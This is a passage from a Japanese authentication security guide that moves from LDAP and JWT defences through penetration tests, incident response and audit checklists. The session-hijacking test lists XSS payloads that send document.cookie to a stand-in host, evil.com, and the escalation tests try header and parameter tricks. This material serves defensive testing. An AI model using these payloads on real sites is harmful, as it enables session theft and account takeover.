+<p>                    filter_template = "(&(objectClass=user)(sAMAccountName={username})(memberOf=CN=Users,DC={domain}))"</p>
+                    
+<p>                    ldap_filter = filter_template.format(</p>
+<p>                        username=safe_username,</p>
+<p>                        domain=safe_domain</p>
+<p>                    )</p>
+                    
+<p>                    # 追加の検証</p>
+<p>                    if not self.validate_ldap_filter(ldap_filter):</p>
+<p>                        raise ValueError("Invalid LDAP filter generated")</p>
+                    
+<p>                    return ldap_filter</p>
+                
+<p>                def validate_ldap_filter(self, filter_string: str) -> bool:</p>
+<p>                    """LDAPフィルタの妥当性検証"""</p>
+                    
+<p>                    # バランスの取れた括弧</p>
+<p>                    if filter_string.count('(') != filter_string.count(')'):</p>
+<p>                        return False</p>
+                    
+<p>                    # 危険なパターンの検出</p>
+<p>                    dangerous_patterns = [</p>
+<p>                        r'\\00',  # Null byte</p>
+<p>                        r'\)\s*\(',  # 複数フィルタの連結</p>
+<p>                        r'objectClass=\*'  # ワイルドカード</p>
+<p>                    ]</p>
+                    
+<p>                    for pattern in dangerous_patterns:</p>
+<p>                        if re.search(pattern, filter_string):</p>
+<p>                            return False</p>
+                    
+<p>                    return True</p>
+<p>            ''',</p>
+            
+<p>            'jwt_manipulation': '''</p>
+<p>            class JWTManipulationDefense:</p>
+<p>                """JWT操作攻撃対策"""</p>
+                
+<p>                def __init__(self):</p>
+<p>                    self.allowed_algorithms = ['RS256', 'ES256']  # 安全なアルゴリズムのみ</p>
+<p>                    self.key_store = KeyStore()</p>
+                
+<p>                def validate_jwt_securely(self, token: str) -> Optional[dict]:</p>
+<p>                    """セキュアなJWT検証"""</p>
+                    
+<p>                    try:</p>
+<p>                        # ヘッダーの事前検証</p>
+<p>                        unverified_header = jwt.get_unverified_header(token)</p>
+                        
+<p>                        # アルゴリズムの検証</p>
+<p>                        if unverified_header.get('alg') not in self.allowed_algorithms:</p>
+<p>                            self.log_security_event(</p>
+<p>                                "Invalid JWT algorithm",</p>
+<p>                                {"algorithm": unverified_header.get('alg')}</p>
+<p>                            )</p>
+<p>                            return None</p>
+                        
+<p>                        # 'none' アルゴリズムの明示的な拒否</p>
+<p>                        if unverified_header.get('alg').lower() == 'none':</p>
+<p>                            return None</p>
+                        
+<p>                        # キーの取得</p>
+<p>                        key_id = unverified_header.get('kid')</p>
+<p>                        if not key_id:</p>
+<p>                            return None</p>
+                        
+<p>                        public_key = self.key_store.get_public_key(key_id)</p>
+<p>                        if not public_key:</p>
+<p>                            return None</p>
+                        
+<p>                        # JWT検証</p>
+<p>                        claims = jwt.decode(</p>
+<p>                            token,</p>
+<p>                            public_key,</p>
+<p>                            algorithms=[unverified_header['alg']],</p>
+<p>                            options={</p>
+<p>                                'verify_signature': True,</p>
+<p>                                'verify_exp': True,</p>
+<p>                                'verify_nbf': True,</p>
+<p>                                'verify_iat': True,</p>
+<p>                                'verify_aud': True,</p>
+<p>                                'require_exp': True,</p>
+<p>                                'require_iat': True,</p>
+<p>                                'require_sub': True</p>
+<p>                            }</p>
+<p>                        )</p>
+                        
+<p>                        # 追加のクレーム検証</p>
+<p>                        if not self.validate_custom_claims(claims):</p>
+<p>                            return None</p>
+                        
+<p>                        return claims</p>
+                        
+<p>                    except jwt.InvalidTokenError as e:</p>
+<p>                        self.log_security_event(</p>
+<p>                            "JWT validation failed",</p>
+<p>                            {"error": str(e), "token_preview": token[:20]}</p>
+<p>                        )</p>
+<p>                        return None</p>
+                
+<p>                def validate_custom_claims(self, claims: dict) -> bool:</p>
+<p>                    """カスタムクレームの検証"""</p>
+                    
+<p>                    # 必須クレームの存在確認</p>
+<p>                    required_claims = ['sub', 'iat', 'exp', 'jti']</p>
+<p>                    for claim in required_claims:</p>
+<p>                        if claim not in claims:</p>
+<p>                            return False</p>
+                    
+<p>                    # JTI（JWT ID）の重複チェック</p>
+<p>                    if self.is_jti_used(claims['jti']):</p>
+<p>                        self.log_security_event(</p>
+<p>                            "JWT replay attempt detected",</p>
+<p>                            {"jti": claims['jti']}</p>
+<p>                        )</p>
+<p>                        return False</p>
+                    
+<p>                    # 発行時刻の妥当性</p>
+<p>                    iat = claims['iat']</p>
+<p>                    current_time = int(time.time())</p>
+                    
+<p>                    # 未来の日付は拒否</p>
+<p>                    if iat > current_time + 60:  # 1分の余裕</p>
+<p>                        return False</p>
+                    
+<p>                    # 古すぎるトークンは拒否</p>
+<p>                    if current_time - iat > 86400:  # 24時間</p>
+<p>                        return False</p>
+                    
+<p>                    return True</p>
+<p>            '''</p>
+<p>        }</p>
+<p></code></pre></p><h2>11.2 ペネトレーションテスト</h2><h3>11.2.1 認証認可システムのペンテスト</h3><p><pre><code>python</p>
+<p>class AuthenticationPenetrationTesting:</p>
+<p>    """認証システムのペネトレーションテスト"""</p>
+    
+<p>    def test_plan(self):</p>
+<p>        """テスト計画"""</p>
+        
+<p>        return {</p>
+<p>            'scope': {</p>
+<p>                'included': [</p>
+<p>                    'ログイン機能',</p>
+<p>                    'パスワードリセット',</p>
+<p>                    'MFA実装',</p>
+<p>                    'セッション管理',</p>
+<p>                    'API認証'</p>
+<p>                ],</p>
+<p>                'excluded': [</p>
+<p>                    '本番データベース',</p>
+<p>                    'サードパーティサービス'</p>
+<p>                ],</p>
+<p>                'test_accounts': [</p>
+<p>                    'pentest_user_01@example.com',</p>
+<p>                    'pentest_admin_01@example.com'</p>
+<p>                ]</p>
+<p>            },</p>
+            
+<p>            'methodology': '''</p>
+<p>            class PentestMethodology:</p>
+<p>                """ペンテスト方法論"""</p>
+                
+<p>                def __init__(self):</p>
+<p>                    self.phases = [</p>
+<p>                        'reconnaissance',</p>
+<p>                        'scanning',</p>
+<p>                        'enumeration',</p>
+<p>                        'vulnerability_assessment',</p>
+<p>                        'exploitation',</p>
+<p>                        'post_exploitation',</p>
+<p>                        'reporting'</p>
+<p>                    ]</p>
+                
+<p>                async def execute_pentest(self):</p>
+<p>                    """ペンテストの実行"""</p>
+                    
+<p>                    results = PentestResults()</p>
+                    
+<p>                    # 1. 偵察フェーズ</p>
+<p>                    recon_results = await self.reconnaissance_phase()</p>
+<p>                    results.add_findings('reconnaissance', recon_results)</p>
+                    
+<p>                    # 2. スキャニングフェーズ</p>
+<p>                    scan_results = await self.scanning_phase()</p>
+<p>                    results.add_findings('scanning', scan_results)</p>
+                    
+<p>                    # 3. 列挙フェーズ</p>
+<p>                    enum_results = await self.enumeration_phase()</p>
+<p>                    results.add_findings('enumeration', enum_results)</p>
+                    
+<p>                    # 4. 脆弱性評価</p>
+<p>                    vuln_results = await self.vulnerability_assessment()</p>
+<p>                    results.add_findings('vulnerabilities', vuln_results)</p>
+                    
+<p>                    # 5. エクスプロイト</p>
+<p>                    exploit_results = await self.exploitation_phase()</p>
+<p>                    results.add_findings('exploits', exploit_results)</p>
+                    
+<p>                    return results</p>
+<p>            '''</p>
+<p>        }</p>
+    
+<p>    def authentication_tests(self):</p>
+<p>        """認証テストケース"""</p>
+        
+<p>        return {</p>
+<p>            'password_policy_tests': '''</p>
+<p>            class PasswordPolicyTests:</p>
+<p>                """パスワードポリシーのテスト"""</p>
+                
+<p>                async def test_weak_passwords(self):</p>
+<p>                    """弱いパスワードのテスト"""</p>
+                    
+<p>                    weak_passwords = [</p>
+<p>                        'password',</p>
+<p>                        '12345678',</p>
+<p>                        'qwerty123',</p>
+<p>                        'admin@123',</p>
+<p>                        'Password1!',  # 一般的なパターン</p>
+<p>                        self.target_company_name + '123',</p>
+<p>                        self.current_year + '!',</p>
+<p>                    ]</p>
+                    
+<p>                    results = []</p>
+<p>                    for password in weak_passwords:</p>
+<p>                        result = await self.attempt_registration(</p>
+<p>                            email='test@example.com',</p>
+<p>                            password=password</p>
+<p>                        )</p>
+                        
+<p>                        if result.success:</p>
+<p>                            results.append({</p>
+<p>                                'severity': 'HIGH',</p>
+<p>                                'finding': f'Weak password accepted: {password}',</p>
+<p>                                'recommendation': 'Implement stronger password validation'</p>
+<p>                            })</p>
+                    
+<p>                    return results</p>
+                
+<p>                async def test_password_complexity_bypass(self):</p>
+<p>                    """パスワード複雑性のバイパステスト"""</p>
+                    
+<p>                    bypass_attempts = [</p>
+<p>                        {</p>
+<p>                            'password': 'P@ssw0rd',  # Unicode look-alike</p>
+<p>                            'technique': 'unicode_substitution'</p>
+<p>                        },</p>
+<p>                        {</p>
+<p>                            'password': 'Admin123!​',  # Zero-width space</p>
+<p>                            'technique': 'invisible_characters'</p>
+<p>                        },</p>
+<p>                        {</p>
+<p>                            'password': 'a' * 1000 + '1!A',  # Length attack</p>
+<p>                            'technique': 'excessive_length'</p>
+<p>                        }</p>
+<p>                    ]</p>
+                    
+<p>                    vulnerabilities = []</p>
+<p>                    for attempt in bypass_attempts:</p>
+<p>                        if await self.test_password_bypass(attempt):</p>
+<p>                            vulnerabilities.append({</p>
+<p>                                'severity': 'MEDIUM',</p>
+<p>                                'technique': attempt['technique'],</p>
+<p>                                'impact': 'Password policy bypass'</p>
+<p>                            })</p>
+                    
+<p>                    return vulnerabilities</p>
+<p>            ''',</p>
+            
+<p>            'session_security_tests': '''</p>
+<p>            class SessionSecurityTests:</p>
+<p>                """セッションセキュリティテスト"""</p>
+                
+<p>                async def test_session_fixation(self):</p>
+<p>                    """セッション固定攻撃のテスト"""</p>
+                    
+<p>                    # 1. 攻撃者がセッションIDを取得</p>
+<p>                    attacker_session = await self.create_anonymous_session()</p>
+                    
+<p>                    # 2. 被害者にセッションIDを設定</p>
+<p>                    victim_client = self.create_test_client()</p>
+<p>                    victim_client.set_session_id(attacker_session.id)</p>
+                    
+<p>                    # 3. 被害者がログイン</p>
+<p>                    await victim_client.login(</p>
+<p>                        username='victim@example.com',</p>
+<p>                        password='ValidPassword123!'</p>
+<p>                    )</p>
+                    
+<p>                    # 4. 攻撃者が同じセッションIDでアクセス</p>
+<p>                    attacker_client = self.create_test_client()</p>
+<p>                    attacker_client.set_session_id(attacker_session.id)</p>
+                    
+<p>                    # 認証されたリソースへのアクセステスト</p>
+<p>                    profile = await attacker_client.get('/api/profile')</p>
+                    
+<p>                    if profile.status_code == 200:</p>
+<p>                        return {</p>
+<p>                            'vulnerability': 'Session Fixation',</p>
+<p>                            'severity': 'CRITICAL',</p>
+<p>                            'proof_of_concept': attacker_session.id,</p>
+<p>                            'remediation': 'Regenerate session ID after login'</p>
+<p>                        }</p>
+                    
+<p>                    return None</p>
+                
+<p>                async def test_session_hijacking_vectors(self):</p>
+<p>                    """セッションハイジャックのベクターテスト"""</p>
+                    
+<p>                    vectors = []</p>
+                    
+<p>                    # 1. XSS経由でのセッション窃取</p>
+<p>                    xss_payloads = [</p>
+<p>                        "<script>fetch('/steal?cookie='+document.cookie)</script>",</p>
+<p>                        "<img src=x onerror=this.src='//evil.com/'+document.cookie>",</p>
+<p>                        "';fetch('//evil.com/'+btoa(document.cookie))//",</p>
+<p>                    ]</p>
+                    
+<p>                    for payload in xss_payloads:</p>
+<p>                        if await self.test_xss_vector(payload):</p>
+<p>                            vectors.append({</p>
+<p>                                'vector': 'XSS',</p>
+<p>                                'payload': payload,</p>
+<p>                                'impact': 'Session theft possible'</p>
+<p>                            })</p>
+                    
+<p>                    # 2. HTTPSダウングレード</p>
+<p>                    if await self.test_https_downgrade():</p>
+<p>                        vectors.append({</p>
+<p>                            'vector': 'HTTPS Downgrade',</p>
+<p>                            'impact': 'Session token exposure over HTTP'</p>
+<p>                        })</p>
+                    
+<p>                    # 3. セッションの予測可能性</p>
+<p>                    session_ids = await self.collect_session_ids(100)</p>
+<p>                    if self.analyze_session_randomness(session_ids) < 0.9:</p>
+<p>                        vectors.append({</p>
+<p>                            'vector': 'Predictable Session IDs',</p>
+<p>                            'impact': 'Session IDs can be guessed'</p>
+<p>                        })</p>
+                    
+<p>                    return vectors</p>
+<p>            '''</p>
+<p>        }</p>
+    
+<p>    def authorization_tests(self):</p>
+<p>        """認可テストケース"""</p>
+        
+<p>        return {</p>
+<p>            'privilege_escalation_tests': '''</p>
+<p>            class PrivilegeEscalationTests:</p>
+<p>                """権限昇格テスト"""</p>
+                
+<p>                async def test_horizontal_escalation(self):</p>
+<p>                    """水平的権限昇格のテスト"""</p>
+                    
+<p>                    # 2つのテストユーザーでログイン</p>
+<p>                    user1 = await self.login_as_user('user1@example.com')</p>
+<p>                    user2 = await self.login_as_user('user2@example.com')</p>
+                    
+<p>                    # User1のリソースを作成</p>
+<p>                    resource = await user1.create_resource({</p>
+<p>                        'name': 'Private Document',</p>
+<p>                        'content': 'Sensitive data'</p>
+<p>                    })</p>
+                    
+<p>                    # User2でUser1のリソースにアクセス試行</p>
+<p>                    escalation_attempts = [</p>
+<p>                        # 直接的なIDアクセス</p>
+<p>                        user2.get(f'/api/resources/{resource.id}'),</p>
+                        
+<p>                        # IDの推測</p>
+<p>                        user2.get(f'/api/resources/{resource.id + 1}'),</p>
+<p>                        user2.get(f'/api/resources/{resource.id - 1}'),</p>
+                        
+<p>                        # パラメータ改ざん</p>
+<p>                        user2.get('/api/resources', params={'user_id': user1.id}),</p>
+                        
+<p>                        # GraphQLでの試行</p>
+<p>                        user2.post('/graphql', json={</p>
+<p>                            'query': f'{{ resource(id: "{resource.id}") {{ content }} }}'</p>
+<p>                        })</p>
+<p>                    ]</p>
+                    
+<p>                    vulnerabilities = []</p>
+<p>                    for attempt in escalation_attempts:</p>
+<p>                        result = await attempt</p>
+<p>                        if result.status_code == 200:</p>
+<p>                            vulnerabilities.append({</p>
+<p>                                'type': 'Horizontal Privilege Escalation',</p>
+<p>                                'endpoint': attempt.url,</p>
+<p>                                'method': attempt.method,</p>
+<p>                                'severity': 'HIGH'</p>
+<p>                            })</p>
+                    
+<p>                    return vulnerabilities</p>
+                
+<p>                async def test_vertical_escalation(self):</p>
+<p>                    """垂直的権限昇格のテスト"""</p>
+                    
+<p>                    regular_user = await self.login_as_user('regular@example.com')</p>
+                    
+<p>                    # 管理者機能へのアクセス試行</p>
+<p>                    admin_endpoints = [</p>
+<p>                        '/api/admin/users',</p>
+<p>                        '/api/admin/settings',</p>
+<p>                        '/api/admin/logs',</p>
+<p>                        '/api/system/config'</p>
+<p>                    ]</p>
+                    
+<p>                    escalation_techniques = [</p>
+<p>                        # HTTPメソッドの変更</p>
+<p>                        lambda ep: regular_user.get(ep),</p>
+<p>                        lambda ep: regular_user.post(ep),</p>
+<p>                        lambda ep: regular_user.put(ep),</p>
+                        
+<p>                        # ヘッダーの追加</p>
+<p>                        lambda ep: regular_user.get(ep, headers={'X-Admin': 'true'}),</p>
+<p>                        lambda ep: regular_user.get(ep, headers={'X-Forwarded-For': '127.0.0.1'}),</p>
+                        
+<p>                        # パラメータの追加</p>
+<p>                        lambda ep: regular_user.get(ep, params={'admin': 'true'}),</p>
+<p>                        lambda ep: regular_user.get(ep, params={'role': 'admin'}),</p>
+<p>                    ]</p>
+                    
+<p>                    vulnerabilities = []</p>
+<p>                    for endpoint in admin_endpoints:</p>
+<p>                        for technique in escalation_techniques:</p>
+<p>                            try:</p>
+<p>                                response = await technique(endpoint)</p>
+<p>                                if response.status_code != 403:</p>
+<p>                                    vulnerabilities.append({</p>
+<p>                                        'endpoint': endpoint,</p>
+<p>                                        'technique': technique.__name__,</p>
+<p>                                        'response_code': response.status_code</p>
+<p>                                    })</p>
+<p>                            except Exception as e:</p>
+<p>                                pass</p>
+                    
+<p>                    return vulnerabilities</p>
+<p>            '''</p>
+<p>        }</p>
+<p></code></pre></p><h2>11.3 インシデント対応</h2><h3>11.3.1 インシデント対応計画</h3><p><pre><code>python</p>
+<p>class IncidentResponsePlan:</p>
+<p>    """インシデント対応計画"""</p>
+    
+<p>    def incident_classification(self):</p>
+<p>        """インシデントの分類"""</p>
+        
+<p>        return {</p>
+<p>            'severity_levels': {</p>
+<p>                'CRITICAL': {</p>
+<p>                    'description': 'システム全体の侵害、大規模データ漏洩',</p>
+<p>                    'response_time': '15分以内',</p>
+<p>                    'escalation': 'CISO, CEO, Legal',</p>
+<p>                    'examples': [</p>
+<p>                        '管理者アカウントの侵害',</p>
+<p>                        '認証システムの完全な侵害',</p>
+<p>                        '大量のユーザー認証情報の漏洩'</p>
+<p>                    ]</p>
+<p>                },</p>
+<p>                'HIGH': {</p>
+<p>                    'description': '限定的な侵害、特定ユーザーへの影響',</p>
+<p>                    'response_time': '1時間以内',</p>
+<p>                    'escalation': 'Security Team Lead, CISO',</p>
+<p>                    'examples': [</p>
+<p>                        '個別アカウントの不正アクセス',</p>
+<p>                        'セッションハイジャック',</p>
+<p>                        '権限昇格の成功'</p>
+<p>                    ]</p>
+<p>                },</p>
+<p>                'MEDIUM': {</p>
+<p>                    'description': '攻撃の試み、潜在的な脅威',</p>
+<p>                    'response_time': '4時間以内',</p>
+<p>                    'escalation': 'Security Team',</p>
+<p>                    'examples': [</p>
+<p>                        'ブルートフォース攻撃の検知',</p>
+<p>                        '異常なアクセスパターン',</p>
+<p>                        'セキュリティ設定の誤り'</p>
+<p>                    ]</p>
+<p>                },</p>
+<p>                'LOW': {</p>
+<p>                    'description': '軽微な問題、監視対象',</p>
+<p>                    'response_time': '24時間以内',</p>
+<p>                    'escalation': 'Security Analyst',</p>
+<p>                    'examples': [</p>
+<p>                        '単発の不正ログイン試行',</p>
+<p>                        '既知の脆弱性スキャン'</p>
+<p>                    ]</p>
+<p>                }</p>
+<p>            }</p>
+<p>        }</p>
+    
+<p>    def incident_response_workflow(self):</p>
+<p>        """インシデント対応ワークフロー"""</p>
+        
+<p>        return {</p>
+<p>            'detection_and_analysis': '''</p>
+<p>            class IncidentDetectionAndAnalysis:</p>
+<p>                """検知と分析フェーズ"""</p>
+                
+<p>                async def detect_security_incident(self, event: SecurityEvent) -> Incident:</p>
+<p>                    """セキュリティインシデントの検知"""</p>
+                    
+<p>                    # 1. イベントの分類</p>
+<p>                    incident_type = self.classify_event(event)</p>
+                    
+<p>                    # 2. 影響範囲の特定</p>
+<p>                    scope = await self.determine_scope(event)</p>
+                    
+<p>                    # 3. 深刻度の評価</p>
+<p>                    severity = self.assess_severity(incident_type, scope)</p>
+                    
+<p>                    # 4. インシデントの作成</p>
+<p>                    incident = Incident(</p>
+<p>                        id=self.generate_incident_id(),</p>
+<p>                        type=incident_type,</p>
+<p>                        severity=severity,</p>
+<p>                        detected_at=datetime.utcnow(),</p>
+<p>                        initial_event=event,</p>
+<p>                        scope=scope,</p>
+<p>                        status='DETECTED'</p>
+<p>                    )</p>
+                    
+<p>                    # 5. 初期対応の開始</p>
+<p>                    await self.initiate_response(incident)</p>
+                    
+<p>                    return incident</p>
+                
+<p>                async def analyze_incident(self, incident: Incident):</p>
+<p>                    """インシデントの詳細分析"""</p>
+                    
+<p>                    analysis = IncidentAnalysis()</p>
+                    
+<p>                    # タイムラインの構築</p>
+<p>                    timeline = await self.build_timeline(incident)</p>
+<p>                    analysis.timeline = timeline</p>
+                    
+<p>                    # 影響を受けたアカウントの特定</p>
+<p>                    affected_accounts = await self.identify_affected_accounts(incident)</p>
+<p>                    analysis.affected_accounts = affected_accounts</p>
+                    
+<p>                    # 攻撃ベクターの特定</p>
+<p>                    attack_vectors = await self.identify_attack_vectors(incident)</p>
+<p>                    analysis.attack_vectors = attack_vectors</p>
+                    
+<p>                    # 侵害の指標（IoC）の抽出</p>
+<p>                    iocs = await self.extract_indicators_of_compromise(incident)</p>
+<p>                    analysis.iocs = iocs</p>
+                    
+<p>                    # 根本原因の分析</p>
+<p>                    root_cause = await self.analyze_root_cause(incident)</p>
+<p>                    analysis.root_cause = root_cause</p>
+                    
+<p>                    return analysis</p>
+<p>            ''',</p>
+            
+<p>            'containment_eradication_recovery': '''</p>
+<p>            class ContainmentEradicationRecovery:</p>
+<p>                """封じ込め、根絶、復旧フェーズ"""</p>
+                
+<p>                async def contain_incident(self, incident: Incident):</p>
+<p>                    """インシデントの封じ込め"""</p>
+                    
+<p>                    containment_actions = []</p>
+                    
+<p>                    # 短期的封じ込め</p>
+<p>                    if incident.type == 'account_compromise':</p>
+<p>                        # 影響を受けたアカウントの無効化</p>
+<p>                        for account_id in incident.affected_accounts:</p>
+<p>                            await self.disable_account(account_id)</p>
+<p>                            containment_actions.append(f"Disabled account: {account_id}")</p>
+                        
+<p>                        # 関連するセッションの無効化</p>
+<p>                        await self.invalidate_user_sessions(incident.affected_accounts)</p>
+<p>                        containment_actions.append("Invalidated all sessions")</p>
+                        
+<p>                        # IPアドレスのブロック</p>
+<p>                        for ip in incident.malicious_ips:</p>
+<p>                            await self.block_ip_address(ip)</p>
+<p>                            containment_actions.append(f"Blocked IP: {ip}")</p>
+                    
+<p>                    # 長期的封じ込め</p>
+<p>                    if incident.severity >= 'HIGH':</p>
+<p>                        # システムの隔離</p>
+<p>                        await self.isolate_affected_systems(incident.affected_systems)</p>
+                        
+<p>                        # ネットワークセグメンテーション</p>
+<p>                        await self.apply_network_segmentation(incident.scope)</p>
+                    
+<p>                    incident.containment_actions = containment_actions</p>
+<p>                    incident.status = 'CONTAINED'</p>
+                
+<p>                async def eradicate_threat(self, incident: Incident):</p>
+<p>                    """脅威の根絶"""</p>
+                    
+<p>                    eradication_actions = []</p>
+                    
+<p>                    # マルウェアの除去</p>
+<p>                    if incident.has_malware:</p>
+<p>                        removed_malware = await self.remove_malware(incident.malware_signatures)</p>
+<p>                        eradication_actions.extend(removed_malware)</p>
+                    
+<p>                    # 不正なアカウントの削除</p>
+<p>                    for account in incident.rogue_accounts:</p>
+<p>                        await self.delete_account(account)</p>
+<p>                        eradication_actions.append(f"Deleted rogue account: {account}")</p>
+                    
+<p>                    # バックドアの除去</p>
+<p>                    backdoors = await self.scan_for_backdoors(incident.affected_systems)</p>
+<p>                    for backdoor in backdoors:</p>
+<p>                        await self.remove_backdoor(backdoor)</p>
+<p>                        eradication_actions.append(f"Removed backdoor: {backdoor}")</p>
+                    
+<p>                    # 脆弱性の修正</p>
+<p>                    await self.patch_vulnerabilities(incident.exploited_vulnerabilities)</p>
+                    
+<p>                    incident.eradication_actions = eradication_actions</p>
+<p>                    incident.status = 'ERADICATED'</p>
+                
+<p>                async def recover_systems(self, incident: Incident):</p>
+<p>                    """システムの復旧"""</p>
+                    
+<p>                    recovery_plan = self.create_recovery_plan(incident)</p>
+                    
+<p>                    # 1. バックアップからの復元（必要な場合）</p>
+<p>                    if incident.requires_restoration:</p>
+<p>                        await self.restore_from_backup(</p>
+<p>                            incident.affected_systems,</p>
+<p>                            incident.last_known_good_state</p>
+<p>                        )</p>
+                    
+<p>                    # 2. セキュリティ強化</p>
+<p>                    hardening_actions = await self.apply_security_hardening(</p>
+<p>                        incident.affected_systems</p>
+<p>                    )</p>
+                    
+<p>                    # 3. 監視の強化</p>
+<p>                    await self.enhance_monitoring(incident.scope)</p>
+                    
+<p>                    # 4. 段階的な復旧</p>
+<p>                    for phase in recovery_plan.phases:</p>
+<p>                        await self.execute_recovery_phase(phase)</p>
+                        
+<p>                        # 検証</p>
+<p>                        if not await self.verify_recovery(phase):</p>
+<p>                            await self.rollback_recovery(phase)</p>
+<p>                            raise RecoveryError(f"Recovery phase {phase.name} failed")</p>
+                    
+<p>                    incident.recovery_actions = recovery_plan.get_executed_actions()</p>
+<p>                    incident.status = 'RECOVERED'</p>
+<p>            '''</p>
+<p>        }</p>
+    
+<p>    def post_incident_activities(self):</p>
+<p>        """インシデント後の活動"""</p>
+        
+<p>        return {</p>
+<p>            'lessons_learned': '''</p>
+<p>            class LessonsLearned:</p>
+<p>                """教訓の抽出"""</p>
+                
+<p>                async def conduct_post_mortem(self, incident: Incident) -> PostMortemReport:</p>
+<p>                    """事後分析の実施"""</p>
+                    
+<p>                    report = PostMortemReport()</p>
+                    
+<p>                    # 1. インシデントの要約</p>
+<p>                    report.summary = self.create_incident_summary(incident)</p>
+                    
+<p>                    # 2. タイムライン分析</p>
+<p>                    report.timeline_analysis = self.analyze_response_timeline(incident)</p>
+                    
+<p>                    # 3. 良かった点</p>
+<p>                    report.what_went_well = [</p>
+<p>                        "迅速な初期検知（15分以内）",</p>
+<p>                        "効果的な封じ込め戦略",</p>
+<p>                        "ステークホルダーへの適切な通知"</p>
+<p>                    ]</p>
+                    
+<p>                    # 4. 改善点</p>
+<p>                    report.what_needs_improvement = [</p>
+<p>                        {</p>
+<p>                            'issue': '初期分析に時間がかかった',</p>
+<p>                            'root_cause': '自動化ツールの不足',</p>
+<p>                            'recommendation': '分析プロセスの自動化'</p>
+<p>                        },</p>
+<p>                        {</p>
+<p>                            'issue': 'バックアップの復元に問題',</p>
+<p>                            'root_cause': 'テストされていないバックアップ',</p>
+<p>                            'recommendation': '定期的な復元テスト'</p>
+<p>                        }</p>
+<p>                    ]</p>
+                    
+<p>                    # 5. アクションアイテム</p>
+<p>                    report.action_items = await self.generate_action_items(incident)</p>
+                    
+<p>                    # 6. 更新が必要なドキュメント</p>
+<p>                    report.documentation_updates = [</p>
+<p>                        'インシデント対応手順書',</p>
+<p>                        'セキュリティポリシー',</p>
+<p>                        '技術的対策ガイド'</p>
+<p>                    ]</p>
+                    
+<p>                    return report</p>
+                
+<p>                async def update_security_controls(self, lessons: PostMortemReport):</p>
+<p>                    """セキュリティ対策の更新"""</p>
+                    
+<p>                    for action_item in lessons.action_items:</p>
+<p>                        if action_item.type == 'technical_control':</p>
+<p>                            await self.implement_technical_control(action_item)</p>
+                        
+<p>                        elif action_item.type == 'process_improvement':</p>
+<p>                            await self.update_process(action_item)</p>
+                        
+<p>                        elif action_item.type == 'training':</p>
+<p>                            await self.schedule_training(action_item)</p>
+                    
+<p>                    # 検知ルールの更新</p>
+<p>                    new_detection_rules = self.create_detection_rules(lessons)</p>
+<p>                    await self.deploy_detection_rules(new_detection_rules)</p>
+                    
+<p>                    # インシデント対応プレイブックの更新</p>
+<p>                    await self.update_playbooks(lessons)</p>
+<p>            '''</p>
+<p>        }</p>
+<p></code></pre></p><h2>11.4 定期的なセキュリティ監査</h2><h3>11.4.1 セキュリティ監査の実施</h3><p><pre><code>python</p>
+<p>class SecurityAuditFramework:</p>
+<p>    """セキュリティ監査フレームワーク"""</p>
+    
+<p>    def audit_checklist(self):</p>
+<p>        """監査チェックリスト"""</p>
+        
+<p>        return {</p>
+<p>            'authentication_audit': '''</p>
+<p>            class AuthenticationAudit:</p>
+<p>                """認証システムの監査"""</p>
+                
+<p>                async def audit_password_policies(self) -> AuditResult:</p>
+<p>                    """パスワードポリシーの監査"""</p>
+                    
+<p>                    findings = []</p>
+                    
+<p>                    # 1. パスワード複雑性要件</p>
+<p>                    policy = await self.get_password_policy()</p>
+                    
+<p>                    if policy.min_length < 12:</p>
+<p>                        findings.append({</p>
+<p>                            'severity': 'MEDIUM',</p>
+<p>                            'finding': 'パスワード最小長が12文字未満',</p>
+<p>                            'current': policy.min_length,</p>
+<p>                            'recommended': 12,</p>
+<p>                            'standard': 'NIST SP 800-63B'</p>
+<p>                        })</p>
+                    
+<p>                    # 2. パスワード履歴</p>
+<p>                    if policy.history_count < 5:</p>
+<p>                        findings.append({</p>
+<p>                            'severity': 'LOW',</p>
+<p>                            'finding': 'パスワード履歴が不十分',</p>
+<p>                            'current': policy.history_count,</p>
+<p>                            'recommended': 5</p>
+<p>                        })</p>
+                    
+<p>                    # 3. 漏洩パスワードチェック</p>
+<p>                    if not policy.breach_check_enabled:</p>
+<p>                        findings.append({</p>
+<p>                            'severity': 'HIGH',</p>
+<p>                            'finding': '漏洩パスワードチェックが無効',</p>
+<p>                            'impact': '既知の侵害されたパスワードが使用可能'</p>
+<p>                        })</p>
+                    
+<p>                    # 4. 実際のパスワード強度分析</p>
+<p>                    strength_analysis = await self.analyze_actual_passwords()</p>
+<p>                    if strength_analysis.weak_password_percentage > 10:</p>
+<p>                        findings.append({</p>
+<p>                            'severity': 'HIGH',</p>
+<p>                            'finding': '弱いパスワードが多数存在',</p>
+<p>                            'percentage': strength_analysis.weak_password_percentage,</p>
+<p>                            'recommendation': 'パスワード強度の強制とユーザー教育'</p>
+<p>                        })</p>
+                    
+<p>                    return AuditResult(</p>
+<p>                        area='Password Policies',</p>
+<p>                        findings=findings,</p>
+<p>                        compliance_score=self.calculate_compliance_score(findings)</p>
+<p>                    )</p>
+                
+<p>                async def audit_mfa_implementation(self) -> AuditResult:</p>
+<p>                    """MFA実装の監査"""</p>
+                    
+<p>                    findings = []</p>
+                    
+<p>                    # MFA採用率</p>
+<p>                    mfa_stats = await self.get_mfa_statistics()</p>
+                    
+<p>                    if mfa_stats.admin_mfa_rate < 100:</p>
+<p>                        findings.append({</p>
+<p>                            'severity': 'CRITICAL',</p>
+<p>                            'finding': '管理者のMFA採用率が100%未満',</p>
+<p>                            'current_rate': mfa_stats.admin_mfa_rate,</p>
+<p>                            'affected_admins': mfa_stats.admins_without_mfa</p>
+<p>                        })</p>
+                    
+<p>                    if mfa_stats.overall_mfa_rate < 50:</p>
+<p>                        findings.append({</p>
+<p>                            'severity': 'MEDIUM',</p>
+<p>                            'finding': '全体のMFA採用率が低い',</p>
+<p>                            'current_rate': mfa_stats.overall_mfa_rate,</p>
+<p>                            'recommendation': 'MFA推進キャンペーンの実施'</p>
+<p>                        })</p>
+                    
+<p>                    # MFA方式の評価</p>
+<p>                    mfa_methods = await self.get_mfa_methods_distribution()</p>
+                    
+<p>                    if mfa_methods.sms_percentage > 30:</p>
+<p>                        findings.append({</p>
+<p>                            'severity': 'MEDIUM',</p>
+<p>                            'finding': 'SMS認証の使用率が高い',</p>
+<p>                            'risk': 'SIMスワップ攻撃のリスク',</p>
+<p>                            'recommendation': 'TOTPまたはハードウェアキーへの移行'</p>
+<p>                        })</p>
+                    
+<p>                    # バックアップコード管理</p>
+<p>                    backup_audit = await self.audit_backup_codes()</p>
+<p>                    if backup_audit.unused_rate > 80:</p>
+<p>                        findings.append({</p>
